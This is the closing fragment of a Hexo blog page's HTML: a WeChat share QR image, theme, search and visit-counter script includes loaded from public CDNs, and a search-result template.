    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACtElEQVR42u3awW4iMRAE0Pz/T2evKyVAVdvNstKbUxRgxs9IblPtr6/4+n5w/f3qz3c+evXnndunXL7w8PDwLg397qDzyXo+znzMeHh4eNu85HbJAt0O/Tk+n7KH/8fDw8P7SF5SSE4mIt9e4+Hh4f2PvASZY9rihIeHh/dOXhuhtu9MhnUe+OLh4eG9h5d3kT7n75X+Hh4eHt5xV33WDDspOckTi9Hi4eHhLfDyBff7+Jot9LPjBXh4eHjbvHYpzw8BtFFvW36KMBcPDw/vEi8/DtWGpLNmWB4NH3X28PDw8I55eVPqbrMqP3o1a6Hh4eHhbfASRrLQt8FrHjQcHQjAw8PDW+PljagZdTbodtJfFA88PDy8S7zzCHW2sZ6FHUkJqZNjPDw8vANe3mRKluw8fp21x+rCgIeHh7fAaxvz+at5MyxvbkVfCR4eHt4Cr92qtlvetnjk2+7ii8HDw8O7ymuHnm9z8035bFKiAoOHh4e3wGthbUjRhrOzMPfFZ/Hw8PDWeCcRQ7sd3z5q8PAXAx4eHt4ab3Yg4DmmLTbtgQY8PDy8d/LaWyeN/HxA7f1nmQMeHh7eHi/fOs9Cinzjnh8sOIok8PDw8BZ4G8Fue2Qhgb34FB4eHt4C7zw4OD8oMAsjilAYDw8P7xLvvME/24jXcx+XnwvdMzw8PLy4GLRxak46ByfXL1OAh4eHt8zLW2Lt4p6Uk7ZcFfkuHh4e3iXe+bJ7si1uQ962hYaHh4e3wbvVmE9ul8cZecj7devCw8PDK3n1z/uDaLUNavPCUJyJwMPDw7vEmz0mH2LbPLtc0/Dw8PD+KW92KCqPG/KnRyUHDw8P7wN4SZCa5wOzJlwRHOPh4eGt8dqNb97QyptSs7jhxVPw8PDwFnizX/TJ4t5uymclZOXcGR4eHt7vd/gDHRbkKT6rh1MAAAAASUVORK5CYII=" alt="å¾®ä¿¡åˆ†äº«äºŒç»´ç ">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->





</body>
</html>
